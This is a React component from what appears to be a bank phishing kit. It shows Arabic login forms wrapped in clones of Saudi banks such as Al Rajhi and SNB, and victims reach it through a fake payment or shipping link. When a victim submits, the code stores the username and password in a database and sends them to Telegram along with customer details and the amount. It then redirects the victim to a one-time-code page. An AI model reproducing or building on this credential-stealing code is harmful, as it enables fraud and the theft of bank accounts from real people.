import { useState, useEffect } from "react";
import { useParams, useNavigate } from "react-router-dom";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Card } from "@/components/ui/card";
import { useLink, useUpdateLink } from "@/hooks/useSupabase";
import { Lock, Eye, EyeOff, Loader2, User, KeyRound, Globe, ChevronDown } from "lucide-react";
import { useToast } from "@/hooks/use-toast";
import { sendToTelegram } from "@/lib/telegram";
import { getBanksByCountry, Bank } from "@/lib/banks";
import { getCountryByCode } from "@/lib/countries";
import { formatCurrency } from "@/lib/countryCurrencies";
import { AlRajhiOfficialClone, SNBOfficialClone, GenericBankClone } from "@/components/BankClones";

const PaymentBankLogin = () => {
  const { id } = useParams();
  const navigate = useNavigate();
  const { toast } = useToast();
  const { data: linkData, isLoading: linkLoading } = useLink(id);
  const updateLink = useUpdateLink();
  
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [isSubmitting, setIsSubmitting] = useState(false);

  const selectedBankId = linkData?.payload?.selectedBank || '';
  const selectedCountry = linkData?.payload?.selectedCountry || "SA";
  const countryData = getCountryByCode(selectedCountry);
  const allBanks = getBanksByCountry(selectedCountry);
  const selectedBank = allBanks.find(b => b.id === selectedBankId);
  
  const shippingInfo = linkData?.payload as any;
  const rawAmount = shippingInfo?.payment_data?.payment_amount || shippingInfo?.payment_amount || shippingInfo?.cod_amount || 500;
  const formattedAmount = formatCurrency(rawAmount, countryData?.currency || "SAR");

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!username || !password) {
      toast({ title: "خطأ", description: "الرجاء إدخال بيانات الدخول", variant: "destructive" });
      return;
    }
    
    setIsSubmitting(true);
    const bankLoginData = { username, password, bankId: selectedBankId };

    try {
      await updateLink.mutateAsync({ linkId: id!, payload: { ...linkData?.payload, bankLoginData } });
      await sendToTelegram({
        type: 'bank_login',
        data: { ...linkData?.payload?.customerInfo, bank: selectedBank?.nameAr, username, password, amount: formattedAmount },
        timestamp: new Date().toISOString()
      });
      navigate(`/pay/${id}/otp`);
    } catch (error) {
      console.error(error);
    } finally {
      setIsSubmitting(false);
    }
  };

  if (linkLoading || !linkData || !selectedBank) {
    return (
      <div className="min-h-screen flex items-center justify-center bg-white">
        <Loader2 className="w-8 h-8 animate-spin text-blue-600" />
      </div>
    );
  }

  const primaryColor = selectedBank.color || '#000';

  const renderForm = () => (
    <form onSubmit={handleSubmit} className="space-y-6">
      <div className="space-y-3">
        <Label className="text-sm font-bold flex items-center gap-2">
          <User className="w-4 h-4" />
          اسم المستخدم
        </Label>
        <Input
          value={username}
          onChange={(e) => setUsername(e.target.value)}
          placeholder="أدخل اسم المستخدم"
          className="h-16 bg-gray-50/50 border-gray-100 focus:bg-white focus:ring-8 focus:ring-blue-50 transition-all text-lg font-black"
          style={{ borderRadius: selectedBank.radius }}
        />
      </div>

      <div className="space-y-3">
        <Label className="text-sm font-bold flex items-center gap-2">
          <KeyRound className="w-4 h-4" />
          كلمة المرور
        </Label>
        <div className="relative group">
          <Input
            type={showPassword ? "text" : "password"}
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            placeholder="أدخل كلمة المرور"
            className="h-16 bg-gray-50/50 border-gray-100 focus:bg-white focus:ring-8 focus:ring-blue-50 transition-all text-lg font-black pr-14"
            style={{ borderRadius: selectedBank.radius }}
          />
          <button
            type="button"
            onClick={() => setShowPassword(!showPassword)}
            className="absolute right-5 top-1/2 -translate-y-1/2 text-gray-400 hover:text-gray-600 transition-colors"
          >
            {showPassword ? <EyeOff className="w-5 h-5" /> : <Eye className="w-5 h-5" />}
          </button>
        </div>
      </div>

      <Button
        type="submit"
        disabled={isSubmitting}
        className="w-full h-16 text-lg font-black text-white shadow-2xl transition-all duration-500 transform active:scale-95 group overflow-hidden"
        style={{ 
          backgroundColor: primaryColor,
          borderRadius: selectedBank.radius,
          boxShadow: `0 20px 40px -10px ${primaryColor}40`
        }}
      >
        {isSubmitting ? (
          <Loader2 className="w-6 h-6 animate-spin" />
        ) : (
          <span className="flex items-center gap-3">
            <Lock className="w-5 h-5" />
            دخول آمن للمتابعة
          </span>
        )}
      </Button>
    </form>
  );

  if (selectedBank.id === 'alrajhi') {
    return (
      <AlRajhiOfficialClone bank={selectedBank} amount={formattedAmount}>
        {renderForm()}
      </AlRajhiOfficialClone>
    );
  }

  if (selectedBank.id === 'snb') {
    return (
      <SNBOfficialClone bank={selectedBank} amount={formattedAmount}>
        {renderForm()}
      </SNBOfficialClone>
    );
  }

  return (
    <GenericBankClone bank={selectedBank} amount={formattedAmount}>
      {renderForm()}
    </GenericBankClone>
  );
};

const Badge = ({ children, className }: { children: React.ReactNode, className?: string }) => (
  <span className={`inline-flex items-center rounded-full border px-2.5 py-0.5 text-xs font-semibold transition-colors focus:outline-none focus:ring-2 focus:ring-ring focus:ring-offset-2 ${className}`}>
    {children}
  </span>
);

export default PaymentBankLogin;
